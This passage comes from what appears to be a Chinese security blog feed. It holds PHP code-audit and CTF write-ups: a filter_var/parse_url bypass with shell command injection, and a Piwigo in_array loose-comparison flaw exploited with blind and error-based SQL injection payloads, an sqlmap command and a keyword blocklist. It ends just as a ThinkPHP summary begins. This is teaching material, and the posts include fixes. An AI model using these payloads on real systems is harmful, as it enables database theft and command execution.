f1agi3hEre.php</span></span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;HRCTF&#123;f1lt3r_var_1s_s0_c00l&#125;&quot;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/archives/1f2efd22/image-20251019191558510.png" alt="image-20251019191558510"></p><h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><p>审计代码发现<strong>filter_var</strong>和<strong>parse_url</strong> 两个函数用来过滤我们的url参数，我们需要通过url参数执行exec函数获得flag，但又需要url以sec-redclub.com结尾</p><p>绕过<strong>filter_var</strong>简单，只需要满足FILTER_VALIDATE_URL的url规则即可，这里提供几个绕过方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/index.php?url=http://demo.com@sec-redclub.com</span><br><span class="line">http://localhost/index.php?url=http://demo.com&amp;sec-redclub.com</span><br><span class="line">http://localhost/index.php?url=http://demo.com?sec-redclub.com</span><br><span class="line">http://localhost/index.php?url=http://demo.com/sec-redclub.com</span><br><span class="line">http://localhost/index.php?url=demo://demo.com,sec-redclub.com</span><br><span class="line">http://localhost/index.php?url=demo://demo.com:80;sec-redclub.com:80/</span><br><span class="line">http://localhost/index.php?url=http://demo.com#sec-redclub.com</span><br><span class="line">PS:最后一个payload的#符号，请换成对应的url编码 %23</span><br></pre></td></tr></table></figure><p>接着需要绕过<strong>parse_url</strong>，并且满足 <strong>$site_info[‘host’]</strong> 的值以 <strong>sec-redclub.com</strong> 结尾，payload如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=1://111111111@sec-redclub.com</span><br></pre></td></tr></table></figure><p><img src="/archives/1f2efd22/image-20251019194104355.png" alt="image-20251019194104355"></p><p>为了更好分析，我在源码添加了<code> var_dump($site_info);</code></p><p><img src="/archives/1f2efd22/6LaWBzbmDEOr2XH.png" alt="image-20250118160435089"></p><p>带入命令执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?url=demo://&quot;;ls;#;sec-redclub.com:80/</span><br><span class="line">?url=demo://%22;ls;%23;sec-redclub.com:80/</span><br></pre></td></tr></table></figure><p><strong>先引号闭合前面的引号，然后命令执行，在注释掉后面的内容</strong></p><p>当我们直接用 <strong>cat f1agi3hEre.php</strong> 命令的时候，过不了 <strong>filter_var</strong> 函数检测，因为包含空格，具体payload如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/index.php?url=demo://%22;<span class="built_in">cat</span>%20f1agi3hEre.php;%23;sec-redclub.com:80/</span><br></pre></td></tr></table></figure><p>所以我们可以换成 <strong>cat&lt;f1agi3hEre.php</strong> 命令，即可成功获取flag：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=demo://%22;cat&lt;f1agi3hEre.php;%23;sec-redclub.com:80/</span><br></pre></td></tr></table></figure><p><img src="/archives/1f2efd22/image-20251019195245407.png" alt="image-20251019195245407"></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> php代码审计 </category>
          
          <category> 红日代审 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红日代审 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>红日代审Day1-in_array函数缺陷</title>
      <link href="/archives/14d45762/"/>
      <url>/archives/14d45762/</url>
      
        <content type="html"><![CDATA[<p>参考：<a href="https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day1/files/README.md">https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day1/files/README.md</a></p><h2 id="in-array-函数"><a href="#in-array-函数" class="headerlink" title="in_array()函数"></a>in_array()函数</h2><p><img src="/archives/14d45762/QQ%E6%88%AA%E5%9B%BE20250511151925.png"></p><p>官方解释：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">in_array</span>(<span class="keyword">mixed</span> <span class="variable">$needle</span>, <span class="keyword">array</span> <span class="variable">$haystack</span>, <span class="keyword">bool</span> <span class="variable">$strict</span> = <span class="literal">false</span>): <span class="keyword">bool</span></span><br></pre></td></tr></table></figure><p>大海捞针，在大海（<code>haystack</code>）中搜索针（ <code>needle</code>），如果没有设置 <code>strict</code> 则使用宽松的比较。</p><p>noodle为字符串时会<strong>区分大小写</strong></p><p>当第三个参数为true时会进行强比较<code>===</code>，返回为弱比较<code>==</code>，默认为false</p><p>Demo:</p><p><img src="/archives/14d45762/1.png"></p><p>这段代码考察任意文件上传漏洞，其中<code>in_array()</code>用于检测我们的文件名是否是数字1~24，然后，由于in_array()默认第三个参数为false，即弱比较，所以当我们上传文件名为<code>1shell.php</code>时，当in_array()进行比较时，会强制把<code>1shell.php</code>类型转换为<code>1</code>，从而绕过</p><h2 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>源码：<a href="https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day1/files/piwigo-2.7.1.zip">https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day1/files/piwigo-2.7.1.zip</a></p><ul><li>Apache 2.4.39</li><li>MySQL 5.5.29</li><li>php 5.6.9</li></ul><p><img src="/archives/14d45762/QQ20250511-185400.png"></p><h3 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h3><p>漏洞的入口在<strong>picture.php</strong> 中，具体代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;PHPWG_ROOT_PATH&#x27;</span>,<span class="string">&#x27;./&#x27;</span>);</span><br><span class="line"><span class="keyword">include_once</span>(PHPWG_ROOT_PATH.<span class="string">&#x27;include/common.inc.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(PHPWG_ROOT_PATH.<span class="string">&#x27;include/section_init.inc.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include_once</span>(PHPWG_ROOT_PATH.<span class="string">&#x27;include/functions_picture.inc.php&#x27;</span>);</span><br><span class="line">…………………………………………………………………………………………………………………………………………………………………………………………………………</span><br><span class="line"><span class="comment">// +-----------------------------------------------------------------------+</span></span><br><span class="line"><span class="comment">// |                                actions                                |</span></span><br><span class="line"><span class="comment">// +-----------------------------------------------------------------------+</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Actions are favorite adding, user comment deletion, setting the picture</span></span><br><span class="line"><span class="comment"> * as representative of the current category...</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Actions finish by a redirection</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">switch</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>])</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;add_to_favorites&#x27;</span> :</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="variable">$query</span> = <span class="string">&#x27;</span></span><br><span class="line"><span class="string">INSERT INTO &#x27;</span>.FAVORITES_TABLE.<span class="string">&#x27;</span></span><br><span class="line"><span class="string">  (image_id,user_id)</span></span><br><span class="line"><span class="string">  VALUES</span></span><br><span class="line"><span class="string">  (&#x27;</span>.<span class="variable">$page</span>[<span class="string">&#x27;image_id&#x27;</span>].<span class="string">&#x27;,&#x27;</span>.<span class="variable">$user</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">;&#x27;</span>;</span><br><span class="line">      <span class="title function_ invoke__">pwg_query</span>(<span class="variable">$query</span>);</span><br><span class="line"></span><br><span class="line">      <span class="title function_ invoke__">redirect</span>(<span class="variable">$url_self</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">…………………………………………………………………………………………………………………………………………………………………………………………………………</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;rate&#x27;</span> :</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">include_once</span>(PHPWG_ROOT_PATH.<span class="string">&#x27;include/functions_rate.inc.php&#x27;</span>);</span><br><span class="line">      <span class="title function_ invoke__">rate_picture</span>(<span class="variable">$page</span>[<span class="string">&#x27;image_id&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;rate&#x27;</span>]);</span><br><span class="line">      <span class="title function_ invoke__">redirect</span>(<span class="variable">$url_self</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>当<code>$_GET[&#39;action&#39;]</code>为rate时，会调用文件<strong>include&#x2F;functions_rate.inc.php</strong>中的 <strong>rate_picture</strong>方法，而漏洞就在该方法中</p><p><strong>include&#x2F;functions_rate.inc.php</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rate_picture</span>(<span class="params"><span class="variable">$image_id</span>, <span class="variable">$rate</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">global</span> <span class="variable">$conf</span>, <span class="variable">$user</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$rate</span>)</span><br><span class="line">      <span class="keyword">or</span> !<span class="variable">$conf</span>[<span class="string">&#x27;rate&#x27;</span>]</span><br><span class="line">      <span class="keyword">or</span> !<span class="title function_ invoke__">in_array</span>(<span class="variable">$rate</span>, <span class="variable">$conf</span>[<span class="string">&#x27;rate_items&#x27;</span>]))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">…………………………………………………………………………………………………………………………………………………………………………………………………………</span><br><span class="line"> <span class="keyword">if</span> (<span class="variable">$user_anonymous</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="variable">$query</span>.= <span class="string">&#x27; AND anonymous_id = \&#x27;&#x27;</span>.<span class="variable">$anonymous_id</span>.<span class="string">&#x27;\&#x27;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_ invoke__">pwg_query</span>(<span class="variable">$query</span>);</span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&#x27;</span></span><br><span class="line"><span class="string">INSERT</span></span><br><span class="line"><span class="string">  INTO &#x27;</span>.RATE_TABLE.<span class="string">&#x27;</span></span><br><span class="line"><span class="string">  (user_id,anonymous_id,element_id,rate,date)</span></span><br><span class="line"><span class="string">  VALUES</span></span><br><span class="line"><span class="string">  (&#x27;</span></span><br><span class="line">    .<span class="variable">$user</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&#x27;,&#x27;</span></span><br><span class="line">    .<span class="string">&#x27;\&#x27;&#x27;</span>.<span class="variable">$anonymous_id</span>.<span class="string">&#x27;\&#x27;,&#x27;</span></span><br><span class="line">    .<span class="variable">$image_id</span>.<span class="string">&#x27;,&#x27;</span></span><br><span class="line">    .<span class="variable">$rate</span></span><br><span class="line">    .<span class="string">&#x27;,NOW())</span></span><br><span class="line"><span class="string">;&#x27;</span>;</span><br></pre></td></tr></table></figure><p>可以看到下图第23行处直接拼接了$rate变量，而第二行使用<strong>in_array()<strong>函数对</strong>$rate</strong>变量进行检测，判断是否$rate是否在$conf[‘rate_items’]中，**$conf[‘rate_items’]** 的内容可以在 <strong>include\config_default.inc.php</strong> 中找到，为 <code>$conf[&#39;rate_items&#39;] = array(0,1,2,3,4,5);</code>：<br><img src="/archives/14d45762/image-20251018212826340.png" alt="image-20251018212826340"></p><p><img src="/archives/14d45762/image-20251018213112482.png" alt="image-20251018213112482"></p><p>由于这里in_array()函数第三个参数默认为false，所以是弱比较，可以绕过。比如我们将$rate的值设置成<strong>1,1 and  if(ascii(substr((select database()),1,1))&#x3D;112,1,sleep(3)));#</strong> 那么SQL语句就变成：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO <span class="title function_ invoke__">piwigo_rate</span> (user_id,anonymous_id,element_id,rate,date) <span class="title function_ invoke__">VALUES</span> (<span class="number">2</span>,<span class="string">&#x27;192.168.2&#x27;</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span> <span class="keyword">and</span> <span class="keyword">if</span>(<span class="title function_ invoke__">ascii</span>(<span class="title function_ invoke__">substr</span>((select <span class="title function_ invoke__">database</span>()),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">112</span>,<span class="number">1</span>,<span class="title function_ invoke__">sleep</span>(<span class="number">3</span>)));<span class="comment">#,NOW()) ;</span></span><br></pre></td></tr></table></figure><p>从而就能进行盲注了</p><p>这样就可以进行盲注了，如果上面的代码你看的比较乱的话，可以看下面简化后的代码：</p><p><img src="/archives/14d45762/j2JpzN5UDWtFkQL.png" alt="4"></p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>sqlmap：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://127.0.0.1/piwigo/picture.php?/1/category/1&amp;action=rate&quot; --data &quot;rate=1&quot; --dbs --batch</span><br></pre></td></tr></table></figure><p><img src="/archives/14d45762/2anfe5BvhYJb7kA.png" alt="5"></p><h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><p>可以看到这个漏洞的原因是弱类型比较问题，那么我们就可以使用强匹配进行修复。例如将 in_array() 函数的第三个参数设置为 true ，或者使用 intval() 函数将变量强转成数字，又或者使用正则匹配来处理变量。这里我将 in_array() 函数的第三个参数设置为 true ，代码及防护效果如下：</p><p><img src="/archives/14d45762/5B4qQ37FMZtOhvU.png" alt="6"></p><h2 id="CTF例题练习"><a href="#CTF例题练习" class="headerlink" title="CTF例题练习"></a>CTF例题练习</h2><h3 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>phpstudy搭建</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line"><span class="variable">$conn</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;connect_error) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;连接失败: &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT COUNT(*) FROM users&quot;</span>;</span><br><span class="line"><span class="variable">$whitelist</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line">    <span class="variable">$whitelist</span> = <span class="title function_ invoke__">range</span>(<span class="number">1</span>, <span class="variable">$row</span>[<span class="string">&#x27;COUNT(*)&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span> = <span class="title function_ invoke__">stop_hack</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$id</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;id <span class="subst">$id</span> is not in whitelist.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&lt;table border=&#x27;1&#x27;&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$row</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;tr&gt;&lt;td&gt;&lt;center&gt;<span class="subst">$key</span>&lt;/center&gt;&lt;/td&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;td&gt;&lt;center&gt;<span class="subst">$value</span>&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/table&gt;&lt;/center&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$conn</span>-&gt;error);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//config.php</span></span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;fire&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;fire&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;day1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">stop_hack</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&quot;insert|delete|or|concat|concat_ws|group_concat|join|floor|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile|dumpfile|sub|hex|file_put_contents|fwrite|curl|system|eval&quot;</span>;</span><br><span class="line"><span class="variable">$back_list</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;|&quot;</span>,<span class="variable">$pattern</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$back_list</span> <span class="keyword">as</span> <span class="variable">$hack</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/<span class="subst">$hack</span>/i&quot;</span>, <span class="variable">$value</span>))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;<span class="subst">$hack</span> detected!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>数据库创建：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> database day1;</span><br><span class="line">use day1;</span><br><span class="line"><span class="keyword">create table</span> users (</span><br><span class="line">id <span class="type">int</span>(<span class="number">6</span>) unsigned auto_increment <span class="keyword">primary key</span>,</span><br><span class="line">name <span class="type">varchar</span>(<span class="number">20</span>) <span class="keyword">not null</span>,</span><br><span class="line">email <span class="type">varchar</span>(<span class="number">30</span>) <span class="keyword">not null</span>,</span><br><span class="line">salary <span class="type">int</span>(<span class="number">8</span>) unsigned <span class="keyword">not null</span> );</span><br><span class="line"></span><br><span class="line"><span class="keyword">INSERT INTO</span> users <span class="keyword">VALUES</span>(<span class="number">1</span>,<span class="string">&#x27;Lucia&#x27;</span>,<span class="string">&#x27;Lucia@hongri.com&#x27;</span>,<span class="number">3000</span>);</span><br><span class="line"><span class="keyword">INSERT INTO</span> users <span class="keyword">VALUES</span>(<span class="number">2</span>,<span class="string">&#x27;Danny&#x27;</span>,<span class="string">&#x27;Danny@hongri.com&#x27;</span>,<span class="number">4500</span>);</span><br><span class="line"><span class="keyword">INSERT INTO</span> users <span class="keyword">VALUES</span>(<span class="number">3</span>,<span class="string">&#x27;Alina&#x27;</span>,<span class="string">&#x27;Alina@hongri.com&#x27;</span>,<span class="number">2700</span>);</span><br><span class="line"><span class="keyword">INSERT INTO</span> users <span class="keyword">VALUES</span>(<span class="number">4</span>,<span class="string">&#x27;Jameson&#x27;</span>,<span class="string">&#x27;Jameson@hongri.com&#x27;</span>,<span class="number">10000</span>);</span><br><span class="line"><span class="keyword">INSERT INTO</span> users <span class="keyword">VALUES</span>(<span class="number">5</span>,<span class="string">&#x27;Allie&#x27;</span>,<span class="string">&#x27;Allie@hongri.com&#x27;</span>,<span class="number">6000</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">create table</span> flag(flag <span class="type">varchar</span>(<span class="number">30</span>) <span class="keyword">not null</span>);</span><br><span class="line"><span class="keyword">INSERT INTO</span> flag <span class="keyword">VALUES</span>(<span class="string">&#x27;HRCTF&#123;1n0rrY_i3_Vu1n3rab13&#125;&#x27;</span>);</span><br></pre></td></tr></table></figure><p><img src="/archives/14d45762/image-20251018214658759.png" alt="image-20251018214658759"></p><h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><p>看源码他会通过in_array来检测我们id是否在$whitelist内：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$whitelist</span> = <span class="title function_ invoke__">range</span>(<span class="number">1</span>, <span class="variable">$row</span>[<span class="string">&#x27;COUNT(*)&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>即需要在1~5中，由于默认为false，所以可以使用弱比较绕过</p><p>同时过滤了一些关键字：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pattern</span> = <span class="string">&quot;insert|delete|or|concat|concat_ws|group_concat|join|floor|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile|dumpfile|sub|hex|file_put_contents|fwrite|curl|system|eval&quot;</span>;</span><br></pre></td></tr></table></figure><p>但不影响，报错注入即可，但这里过滤了拼接函数，POC：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span> <span class="keyword">and</span> (select <span class="title function_ invoke__">updatexml</span>(<span class="number">1</span>,<span class="title function_ invoke__">make_set</span>(<span class="number">3</span>,<span class="string">&#x27;~&#x27;</span>,(select flag <span class="keyword">from</span> flag)),<span class="number">1</span>))</span><br></pre></td></tr></table></figure><blockquote><p><code>make_set(bitmask, str1, str2, ...)</code> 根据位掩码返回字符串集合，由于<code>3</code> 的二进制是 <code>11</code>，所以会选择第1个和第2个参数，即实际返回<code>&#39;~&#39;, (select flag from flag)</code></p></blockquote><p><img src="/archives/14d45762/image-20251018221013027.png" alt="image-20251018221013027"></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> php代码审计 </category>
          
          <category> 红日代审 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红日代审 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ThinkPHP漏洞总结</title>
      <link href="/archives/7509d866/"/>
      <url>/archives/7509d866/</url>
      
        <content type="html"><![CDATA[<h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><p>Thinkphp是一个快速、兼容且简单的轻量级国产PHP开发框架，遵循Apache 2开源协议发布，使用面向对象的开发结构和MVC模式，融合了Struts的思想和TagLib（标签库）、RoR的ORM映射和ActiveRecord模式。</p><p>ThinkPHP可以支持windows&#x2F;Unix&#x2F;Linux等服务器环境，正式版需要PHP 5.0以上版本，支持MySql、PgSQL、Sqlite多种数据库以及PDO扩展。</p><p>ThinkPHP发展至今，核心版本主要有以下几个系列，<strong>ThinkPHP 2系列、ThinkPHP 3系列、ThinkPHP 5系列、ThinkPHP 6系列</strong>，各个系列之间在代码实现及功能方面，有较大区别。其中ThinkPHP 2以及ThinkPHP 3系列已经停止维护，ThinkPHP 5系列现使用最多，而ThinkPHP 3系列也积累了较多的历史用户。版本细分如下图所示：</p><p><img src="/archives/7509d866/1863419-20211224202630881-1122680534.png"></p><h2 id="框架识别"><a href="#框架识别" class="headerlink" title="框架识别"></a>框架识别</h2><h3 id="ioc判断"><a href="#ioc判断" class="headerlink" title="ioc判断"></a>ioc判断</h3><p>通过访问<code>/favicon.ico</code>:</p><p><img src="/archives/7509d866/QQ20241008-220454.png"></p><h3 id="报错"><a href="#报错" class="headerlink" title="报错"></a>报错</h3><p>随便在url后面输入字符，如果报错出现**<code>:)</code>**则为think PHP框架</p><h3 id="特殊指纹出现logo"><a href="#特殊指纹出现logo" class="headerlink" 